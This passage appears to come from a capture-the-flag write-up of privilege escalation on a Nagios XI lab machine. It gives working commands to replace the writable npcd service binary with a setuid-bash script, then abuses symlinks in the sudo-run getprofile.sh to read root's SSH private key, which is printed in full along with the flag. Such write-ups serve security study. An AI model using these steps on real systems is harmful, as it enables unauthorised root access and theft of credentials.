nagios@monitored:/usr/local/nagiosxi/var/components$ for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd -name "$service*" 2>/dev/null; done
/etc/systemd/system/multi-user.target.wants/postgresql.service
/etc/systemd/system/multi-user.target.wants/nagios.service
/etc/systemd/system/multi-user.target.wants/npcd.service
/etc/systemd/system/npcd.service
/etc/systemd/system/multi-user.target.wants/snmptt.service
/etc/systemd/system/multi-user.target.wants/snmptrapd.service
```

- We can inspect the present service files for the `Exec` string and observe which binaries are executed by which services
	- If we have write access to a given directory, we can perform symlink shenanigans!
```sh
nagios@monitored:/usr/local/nagiosxi/var/components$ for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd -name "$service*" 2>/dev/null; done | while read service_file; do echo $service_file && ls -l $(grep Exec $service_file | cut -d= -f2 | cut -d' ' -f1 | sort -u); done 2>/dev/null

/etc/systemd/system/multi-user.target.wants/postgresql.service
-rwxr-xr-x 1 root root 39680 Sep 24  2020 /bin/true
/etc/systemd/system/multi-user.target.wants/nagios.service
-rwxr-xr-x 1 root   root    30952 Apr  6  2021 /usr/bin/kill
-rwxr-xr-x 1 root   root    72704 Sep 24  2020 /usr/bin/rm
-rwxrwxr-- 1 nagios nagios 717648 Nov  9  2023 /usr/local/nagios/bin/nagios
/etc/systemd/system/multi-user.target.wants/npcd.service
-rwxr-xr-- 1 nagios nagios 31584 Nov  9  2023 /usr/local/nagios/bin/npcd
/etc/systemd/system/npcd.service
-rwxr-xr-- 1 nagios nagios 31584 Nov  9  2023 /usr/local/nagios/bin/npcd
/etc/systemd/system/multi-user.target.wants/snmptt.service
-rwxr-xr-x 1 root root  30952 Apr  6  2021  /bin/kill
-rwxr-xr-x 1 root root  43808 Sep 24  2020  /bin/sleep
-rwxr-xr-x 1 root root 182238 Jul 23  2020  /usr/sbin/snmptt
/etc/systemd/system/multi-user.target.wants/snmptrapd.service
-rwxr-xr-x 1 root root 30952 Apr  6  2021 /bin/kill
-rwxr-xr-x 1 root root 34840 Aug 15  2022 /usr/sbin/snmptrapd
```
- There are a few services that perform some form of `Exec*` on binaries that we have write access to! The simplest to exploit would be `npcd`

### ncpd.service
- We can copy the binary to a backup and then write ourselves a malicious shell script that'll be run as `sudo` when we restart the service
```sh
#!/bin/bash

cp /bin/bash /tmp/wallfly
chown root:root /tmp/wallfly
chmod 6777 /tmp/wallfly
```
- We write this script to `/usr/local/nagios/bin/npcd` and ensure its executable

- Then we can perform the exploit by running the vulnerable shell script as `sudo`
```sh
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd

nagios@monitored:/usr/local/nagios/bin$ ls -lah /tmp/wallfly 
-rwsrwsrwx 1 root root 1.2M Feb 23 16:08 /tmp/wallfly

nagios@monitored:/usr/local/nagios/bin$ /tmp/wallfly -p
wallfly-5.1# whoami
root
wallfly-5.1# cat /root/root.txt
376716a57cf9251b45c672e72412e426
```

## get_profile.sh
---
- First the script grabs the first command-line argument, `folder`, and sanitizes of any non-alphanumeric character or `-`
```sh
# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi

# Clean the folder name
folder=$(echo "$folder" | sed -e 's/[^[:alnum:]|-]//g')
```

- It then creates the folder structure and copies things over
```sh
# Make a clean folder (but save profile.html)
rm -rf "/usr/local/nagiosxi/var/components/profile/$folder/"
mkdir "/usr/local/nagiosxi/var/components/profile/$folder/"
mv -f "/usr/local/nagiosxi/tmp/profile-$folder.html" "/usr/local/nagiosxi/var/components/profile/$folder/profile.html"

# Create the folder setup
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/logs"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/versions"

echo "-------------------Fetching Information-------------------"
echo "Please wait......."

echo "Creating system information..."
echo "$distro" > "/usr/local/nagiosxi/var/components/profile/$folder/hostinfo.txt"
echo "$version" >> "/usr/local/nagiosxi/var/components/profile/$folder/hostinfo.txt"

echo "Creating nagios.txt..."
nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"

echo "Creating perfdata.txt..."
perfdata_log_file=$(cat /usr/local/nagios/etc/pnp/process_perfdata.cfg | sed -n -e 's/^LOG_FILE = //p')
tail -n500 "$perfdata_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdata.txt"

echo "Creating npcd.txt..."
npcd_log_file=$(cat /usr/local/nagios/etc/pnp/npcd.cfg | sed -n -e 's/^log_file = //p')
tail -n500 "$npcd_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/npcd.txt"
...
```
- Performing `tail` is interesting because this might lead to an arbitrary `read` vulnerability (as long as the file is less than the `-n` amount of lines)

- Finally, the script create a `zip` archive of all the backed up files
```sh
echo "Zipping logs directory..."

## temporarily change to that directory, zip, then leave
(
    ts=$(date +%s)
    cd /usr/local/nagiosxi/var/components/profile
    mv "$folder" "profile-$ts"
    zip -r profile.zip "profile-$ts"
    rm -rf "profile-$ts"
    mv -f profile.zip ../
)

echo "Backup and Zip complete!"
```

- We can inspect all the `tail` calls to see if the script reads from a directory in which we have write access (symlink shenanigans)
```sh
❯ grep tail getprofile.sh       
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"
tail -n500 "$perfdata_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdata.txt"
tail -n500 "$npcd_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/npcd.txt"
tail -n500 /usr/local/nagiosxi/var/cmdsubsys.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt"
tail -n500 /usr/local/nagiosxi/var/event_handler.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/event_handler.txt"
tail -n500 /usr/local/nagiosxi/var/eventman.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/eventman.txt"
tail -n500 /usr/local/nagiosxi/var/perfdataproc.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdataproc.txt"
tail -n500 /usr/local/nagiosxi/var/sysstat.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/sysstat.txt"
    /usr/bin/tail -n1000 /var/log/messages > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
    /usr/bin/tail -n1000 /var/log/syslog > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
    /usr/bin/tail -n1000 /var/log/snmptrapd.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptrapd.txt"
    /usr/bin/tail -n1000 /var/log/snmptt/snmptt.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptt.txt"
    /usr/bin/tail -n1000 /var/log/snmptt/snmpttsystem.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttsystem.txt"
    /usr/bin/tail -n1000 /var/log/snmpttunknown.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttunknown.log.txt"
            /usr/bin/tail -n1000 /var/log/httpd/$a > "/usr/local/nagiosxi/var/components/profile/$folder/logs/$a.txt"
            /usr/bin/tail -n1000 /var/log/apache2/$a > "/usr/local/nagiosxi/var/components/profile/$folder/logs/$a.txt"
    tail -1
        /usr/bin/tail -n500 /var/log/mysqld.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"
        /usr/bin/tail -n500 /var/log/mariadb/mariadb.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"
        /usr/bin/tail -n500 /var/log/mysql/mysql.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_log.txt"       
            /usr/bin/tail -n500 "$errlog" > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
        /usr/bin/tail -n500 /var/log/mysql.err > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
        /usr/bin/tail -n500 /var/log/mysql/error.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
        /usr/bin/tail -n500 /var/log/mariadb/error.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
FILE=$(ls /usr/local/nagiosxi/nom/checkpoints/nagioscore/ | sort -n -t _ -k 2 | grep .gz | tail -1) 
tail -100 /var/log/maillog > "/usr/local/nagiosxi/var/components/profile/$folder/maillog"
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
```
- Many of the `tail` calls are in directories we have write access to!
	- `/usr/local/nagiosxi/var`
	- `/usr/local/nagiosxi/tmp`

### Read SSH Key
- We can replace one of these files with a symlink to the `root` user's `id_rsa` `ssh` key!
- I'll arbitrarily choose `event_handler.log`
```sh
nagios@monitored:~$ ln -sf /root/.ssh/id_rsa /usr/local/nagiosxi/var/event_handler.log
```

- Now we can call the backup script and then inspect the `event_handler.log` file to see if it's our ticket
```sh
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 12
...
Backup and Zip complete!

nagios@monitored:~$ cd /usr/local/nagiosxi/var/components
nagios@monitored:/usr/local/nagiosxi/var/components$ unzip -p profile.zip profile-1771877898/nagios-logs/event_handler.txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```sh
❯ ssh -i root.id_rsa root@10.129.5.117
root@monitored:~# cat root.txt 
376716a57cf9251b45c672e72412e426
```